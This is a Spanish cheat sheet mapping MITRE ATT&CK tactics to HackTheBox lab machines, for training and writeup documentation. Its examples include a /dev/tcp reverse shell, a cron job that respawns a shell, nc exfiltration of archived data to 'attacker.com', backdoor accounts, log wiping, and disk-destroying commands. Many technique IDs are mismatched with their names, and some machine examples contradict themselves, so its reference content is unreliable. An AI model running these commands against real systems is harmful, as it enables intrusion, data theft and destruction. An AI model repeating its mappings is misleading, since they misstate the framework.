# 🎯 MITRE ATT&CK - Referencia Rápida para HTB

**MITRE ATT&CK** es un framework que documenta tácticas y técnicas reales usadas por atacantes.

---

## 📋 Tácticas Principales (por Orden de Pentesting)

### 1️⃣ RECONNAISSANCE (TA0043)

**¿Qué es?** Recopilación inicial de información sobre el objetivo.

**Técnicas Comunes:**

| Código | Técnica | Descripción | Herramienta HTB |
|--------|---------|-------------|-----------------|
| T1590 | Gather Victim Network Info | Obtener IPs, dominios, ASN | whois, Shodan, dig |
| T1591 | Gather Victim Org Info | Info de empleados, estructura | LinkedIn, Google Dorks |
| T1598 | Phishing for Information | Emails de recon | TheHarvester |
| T1589 | Gather Victim Identity Info | Nombres, roles, direcciones | OSINT tools |
| T1598.003 | Phishing Link | Enlace malicioso para info | Social engineering |

**Ejemplo en HTB:**
```
Máquina: Lame
Técnica: T1590 - Gather Victim Network Info
Acción: whois lame.htb → obtiene información del dominio
```

---

### 2️⃣ RESOURCE DEVELOPMENT (TA0042)

**¿Qué es?** Establecimiento de infraestructura necesaria para el ataque.

**Técnicas Comunes:**

| Código | Técnica | Descripción | En HTB |
|--------|---------|-------------|--------|
| T1583 | Acquire Infrastructure | Comprar servidores, dominios | Preparar listener |
| T1589 | Gather Victim Identity | Recopilar info de empleados | No aplica en HTB |
| T1608 | Artifact Staging | Preparar payloads | Crear shell en msfvenom |

**Ejemplo en HTB:**
```
Máquina: Blue
Técnica: T1608.004 - Prepare Tool
Acción: Compilar privesc exploit en tu máquina
```

---

### 3️⃣ INITIAL ACCESS (TA0001)

**¿Qué es?** Obtención del acceso inicial al sistema.

**Técnicas Comunes:**

| Código | Técnica | Descripción | En HTB |
|--------|---------|-------------|--------|
| T1190 | Exploit Public-Facing App | Atacar aplicación web | SQL Injection, RCE |
| T1133 | External Remote Services | Usar SSH, RDP expuesto | Conexión SSH débil |
| T1200 | Hardware Additions | Agregación de hardware | N/A en HTB |
| T1566 | Phishing | Enviar email malicioso | N/A en HTB (entorno lab) |

**Ejemplo en HTB:**
```
Máquina: Retired
Técnica: T1190 - Exploit Public-Facing Application
Acción: SQL Injection en login.php para acceso
Resultado: www-data user shell obtenido
```

---

### 4️⃣ EXECUTION (TA0002)

**¿Qué es?** Ejecución de código/comandos en el objetivo.

**Técnicas Comunes:**

| Código | Técnica | Descripción | En HTB |
|--------|---------|-------------|--------|
| T1059 | Command & Scripting Interpreter | Ejecutar comandos bash/powershell | Shell inverso |
| T1651 | Exploit for Credential Access | Ejecutar para obtener credenciales | Mimikatz en Windows |
| T1203 | Exploitation for Client Execution | Explotar cliente (navegador, etc) | XSS, CSRF |
| T1559 | Inter-Process Communication | Comunicación entre procesos | N/A en HTB |

**Ejemplo en HTB:**
```
Máquina: Lame
Técnica: T1059.004 - Unix Shell
Acción: bash -i >& /dev/tcp/10.10.14.x/4444 0>&1
Resultado: Shell interactiva obtenida
```

---

### 5️⃣ PERSISTENCE (TA0003)

**¿Qué es?** Mantener el acceso incluso después de reiniciar.

**Técnicas Comunes:**

| Código | Técnica | Descripción | En HTB |
|--------|---------|-------------|--------|
| T1098 | Account Manipulation | Crear usuarios backdoor | useradd backdoor |
| T1547 | Boot or Logon Autostart | Ejecutar al inicio | /etc/rc.d, Task Scheduler |
| T1053 | Scheduled Task/Job | Tareas programadas | Cron job reverso |
| T1136 | Create Account | Crear nuevo usuario | net user backdoor /add |
| T1547.014 | Perl Modules | Cargar módulos Perl | echo 'perl code' >> module |

**Ejemplo en HTB:**
```
Máquina: Blue
Técnica: T1053.005 - Cron
Acción: (crontab -l; echo "* * * * * reverse_shell") | crontab -
Resultado: Shell cada minuto garantizada
```

---

### 6️⃣ PRIVILEGE ESCALATION (TA0004)

**¿Qué es?** Elevar permisos de usuario normal a root/SYSTEM.

**Técnicas Comunes - Linux:**

| Código | Técnica | Descripción | Ejemplo |
|--------|---------|-------------|---------|
| T1548 | Abuse Elevation Control | Explotar mecanismos de elevación | Sudo abuse |
| T1548.004 | Sudo | Ejecutar comandos con sudo | sudo -l → sudo bash |
| T1055 | Process Injection | Inyectar en proceso privilegiado | N/A en HTB |
| T1574 | Hijack Execution Flow | Modificar ruta de bibliotecas | LD_PRELOAD exploit |

**Técnicas Comunes - Windows:**

| Código | Técnica | Descripción | Ejemplo |
|--------|---------|-------------|---------|
| T1548 | Abuse Elevation Control | UAC bypass | UACMe |
| T1547 | Boot or Logon Privilege | Autostart con permisos | Registry modification |
| T1134 | Access Token Manipulation | Usar tokens del sistema | Token impersonation |
| T1134.003 | Make and Impersonate Token | Crear y usar token | incognito.exe |

**Ejemplo en HTB:**
```
Máquina: Kioptrix
Técnica: T1548.004 - Sudo without password
Acción: sudo -l → sudo /usr/bin/nmap --interactive → !sh
Resultado: Acceso root obtenido
```

---

### 7️⃣ DEFENSE EVASION (TA0005)

**¿Qué es?** Evitar detección y evasión de defensas.

**Técnicas Comunes:**

| Código | Técnica | Descripción | En HTB |
|--------|---------|-------------|--------|
| T1140 | Deobfuscate/Decode Data | Desofuscar payloads | Decoder online |
| T1207 | Disable or Modify System Firewall | Deshabilitar firewall | iptables -F |
| T1578 | Modify Cloud Compute Instance | Cambiar config cloud | N/A en HTB |
| T1070 | Indicator Removal on Host | Limpiar logs | history -c, rm logs |

**Ejemplo en HTB:**
```
Máquina: Shocker
Técnica: T1070.004 - File Deletion
Acción: rm /tmp/exploit /tmp/.shell_history
Resultado: Evasión de detección post-explotación
```

---

### 8️⃣ CREDENTIAL ACCESS (TA0006)

**¿Qué es?** Obtención de credenciales válidas.

**Técnicas Comunes:**

| Código | Técnica | Descripción | En HTB |
|--------|---------|-------------|--------|
| T1110 | Brute Force | Fuerza bruta contra credenciales | hydra, hashcat |
| T1187 | Forced Authentication | Forzar autenticación | Responder.py |
| T1056 | Input Capture | Capturar entrada de usuario | Keylogger |
| T1040 | Network Sniffing | Capturar tráfico | Wireshark, tcpdump |
| T1111 | Multi-Stage Channels | Canales multi-etapa | N/A en HTB |

**Ejemplo en HTB:**
```
Máquina: Lame
Técnica: T1110.003 - Password Spraying
Acción: hydra -L users.txt -P passwords.txt ssh://10.10.11.3
Resultado: Credenciales válidas obtenidas
```

---

### 9️⃣ DISCOVERY (TA0007)

**¿Qué es?** Exploración del sistema objetivo después del acceso.

**Técnicas Comunes:**

| Código | Técnica | Descripción | En HTB |
|--------|---------|-------------|--------|
| T1087 | Account Discovery | Descubrir cuentas locales | id, whoami, cat /etc/passwd |
| T1010 | Application Window Discovery | Descubrir ventanas/apps | ps aux, tasklist |
| T1217 | Browser Bookmarks | Extraer bookmarks | ~/.mozilla, ~/.config/google-chrome |
| T1538 | Cloud Service Dashboard | Descubrir servicios cloud | aws s3 ls |
| T1526 | Cloud Service Discovery | Descubrir servicios cloud | nmap -sV cloud-service |
| T1580 | Cloud Infrastructure Discovery | Info de infraestructura | aws ec2 describe-instances |

**Ejemplo en HTB:**
```
Máquina: Blue
Técnica: T1087.001 - Local Account
Acción: cat /etc/passwd → descubrir todos los usuarios
Resultado: Lista completa de usuarios del sistema
```

---

### 🔟 LATERAL MOVEMENT (TA0008)

**¿Qué es?** Movimiento a través de la red objetivo.

**Técnicas Comunes:**

| Código | Técnica | Descripción | En HTB |
|--------|---------|-------------|--------|
| T1570 | Lateral Tool Transfer | Transferir herramientas | nc, wget, curl |
| T1570 | Lateral Tool Transfer | Usar credenciales | Pass-the-Hash |
| T1021 | Remote Services | Usar SSH/RDP | ssh user@host |

**Nota:** En máquinas HTB individuales, lateral movement es menos común.

---

### 1️⃣1️⃣ COLLECTION (TA0009)

**¿Qué es?** Recopilación de datos de interés.

**Técnicas Comunes:**

| Código | Técnica | Descripción | En HTB |
|--------|---------|-------------|--------|
| T1115 | Clipboard Data | Copiar datos del clipboard | xclip, Get-Clipboard |
| T1123 | Audio Capture | Capturar audio | ffmpeg, SoX |
| T1119 | Automated Exfiltration | Exfiltración automática | SCP, FTP |
| T1557 | Man-in-the-Middle | MITM attack | arpspoof, ettercap |

**Ejemplo en HTB:**
```
Máquina: Retired
Técnica: T1005.001 - Data from Local System
Acción: cat /root/root.txt → obtener flag final
Resultado: Flag capturada
```

---

### 1️⃣2️⃣ EXFILTRATION (TA0010)

**¿Qué es?** Extracción de datos fuera del objetivo.

**Técnicas Comunes:**

| Código | Técnica | Descripción | En HTB |
|--------|---------|-------------|--------|
| T1020 | Automated Exfiltration | Exfiltración automática | SSH, HTTP |
| T1048 | Exfiltration Over Alternative Protocol | Protocolo alternativo | DNS tunneling |
| T1041 | Exfiltration Over C2 Channel | Canal C2 | Reverse shell |

**Ejemplo en HTB:**
```
Máquina: Shocker
Técnica: T1041 - Exfiltration Over C2 Channel
Acción: tar czf data.tar.gz /var/www && nc -q 1 attacker.com 4444 < data.tar.gz
Resultado: Datos exfiltrados
```

---

### 1️⃣3️⃣ IMPACT (TA0040)

**¿Qué es?** Acciones que afectan la disponibilidad/integridad del sistema.

**Técnicas Comunes:**

| Código | Técnica | Descripción | En HTB |
|--------|---------|-------------|--------|
| T1531 | Account Access Removal | Eliminar acceso | userdel user |
| T1531 | Data Destruction | Destruir datos | rm -rf / |
| T1486 | Data Encrypted for Impact | Encriptar datos (ransomware) | openssl enc |
| T1561 | Disk Wipe | Limpiar disco | dd if=/dev/zero of=/dev/sdX |

**Nota:** En HTB NO hacemos impact. Solo demostramos el acceso.

---

## 🎯 Mapeo Completo: Máquina HTB Típica

```
┌─────────────────────────────────────────────────────────┐
│               ATAQUE TÍPICO EN HTB                      │
├─────────────────────────────────────────────────────────┤
│                                                          │
│ 1. RECONNAISSANCE (TA0043)                              │
│    └─ T1590: whois, dig, Shodan                        │
│                                                          │
│ 2. RESOURCE DEVELOPMENT (TA0042)                        │
│    └─ T1608: Compilar exploit en máquina atacante      │
│                                                          │
│ 3. INITIAL ACCESS (TA0001)                              │
│    └─ T1190: SQL Injection en login.php                │
│       ↓ www-data user access obtenido                   │
│                                                          │
│ 4. EXECUTION (TA0002)                                   │
│    └─ T1059: bash -i >& /dev/tcp/... shell inverso    │
│                                                          │
│ 5. PERSISTENCE (TA0003)                                 │
│    └─ T1053: Cron job para mantener acceso             │
│                                                          │
│ 6. PRIVILEGE ESCALATION (TA0004)                        │
│    └─ T1548.004: sudo /bin/bash (sin contraseña)       │
│       ↓ Root access obtenido ✅                         │
│                                                          │
│ 7. DEFENSE EVASION (TA0005)                             │
│    └─ T1070: Limpiar logs y historial                  │
│                                                          │
│ 8. CREDENTIAL ACCESS (TA0006)                           │
│    └─ T1110: Brute force contra otros usuarios         │
│                                                          │
│ 9. DISCOVERY (TA0007)                                   │
│    └─ T1087: Descubrir otros usuarios                  │
│                                                          │
│ 10. COLLECTION (TA0009)                                │
│    └─ T1005: Leer flag en /root/root.txt               │
│       ↓ Flag capturada ✅                               │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

---

## 🔗 Recursos Oficiales

- **MITRE ATT&CK Website:** https://attack.mitre.org/
- **ATT&CK Navigator:** https://mitre-attack.github.io/attack-navigator/
- **Mobile ATT&CK:** https://attack.mitre.org/mobile/
- **Cloud ATT&CK:** https://attack.mitre.org/cloud/

---

## 📊 Cómo Documentar Técnicas en tu Writeup

```markdown
## Fase 3: Explotación

### Técnica Utilizada
**Código MITRE:** T1190  
**Táctica:** Initial Access  
**Nombre:** Exploit Public-Facing Application

### Descripción
Se identificó SQL Injection en el parámetro `id` del login.php.

### Comando Ejecutado
\`\`\`bash
sqlmap -u "http://10.10.11.3:80/login.php?id=1" --dbs
\`\`\`

### Resultado
Acceso a base de datos obtenido. Credenciales de admin extraídas.
Posterior acceso SSH como www-data.
```

---

## 💡 Tips

1. **Siempre mapea tácticas** en tu documentación
2. **Usa el código oficial** (T1190, T1059, etc.)
3. **Referencia attack.mitre.org** para más detalles
4. **Explica por qué funciona** la técnica

---

<div align="center">

### Dominando MITRE ATT&CK = Pentesting Profesional

**Las técnicas de verdaderos atacantes = tu caja de herramientas**

</div>
